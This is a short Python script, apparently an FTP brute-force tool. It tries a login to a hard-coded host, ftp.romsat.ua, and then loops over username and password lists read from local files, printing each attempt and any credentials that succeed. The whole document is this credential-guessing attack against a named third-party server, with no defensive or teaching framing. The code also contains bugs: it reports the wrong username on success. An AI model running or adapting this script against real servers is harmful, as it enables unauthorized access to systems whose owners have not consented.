import ftplib


def main():
    host = 'ftp.romsat.ua'
    user = 'anonymouss'
    password = 'anonymouss'
    try:
       ftp = ftplib.FTP(host)
       ftp.login(user, password)
       print(f'Successfully anonymous connected  {ftp.connect()}')
       ftp.quit()
       print(f'Host: {host}\nUsername: {user}\nPassword: {password}')
    except Exception as e:
           try:
              with open('ftp_login.txt', 'r') as f: #Read Logins list file
                   user_free = f.read()
                   users = user_free.split()
                   with open('ftp_password.txt', 'r') as f: # Read Passwords list file
                         pass_free = f.read()
                         passwords = pass_free.split()
                         for username in users:
                             for password in passwords:
                                 print(f'Now try: user {username}:{password}')
                                 ftp = ftplib.FTP(host)
                                 try:
                                    ftp.login(username, password)
                                    print(f'Successfully connected {ftp.connect()}')
                                    ftp.quit()
                                    print(f'Host: {host}\nUsername: {user}\nPassword: {password}')
                                 except:
                                       pass

           except Exception as e:
                  print(f'FTP error {e}')


if __name__ == "__main__":
   main()
